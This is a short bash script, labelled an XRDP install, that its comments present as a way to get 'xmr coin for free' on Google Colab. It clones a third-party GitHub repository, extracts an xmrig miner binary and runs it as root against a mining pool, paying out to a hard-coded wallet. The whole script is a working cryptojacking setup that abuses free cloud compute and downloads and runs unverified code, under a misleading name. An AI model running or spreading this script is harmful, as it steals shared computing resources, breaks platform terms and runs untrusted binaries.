#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
git clone https://github.com/burocos/ngorok.git
cd ngorok
tar xvf xmrig-ngorok.tar.gz
cd xmrig-ngro
sudo ./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SHIB:0x8cc95e87e9110269f61e5f40e88dbe6c347e7ac0.GLAB
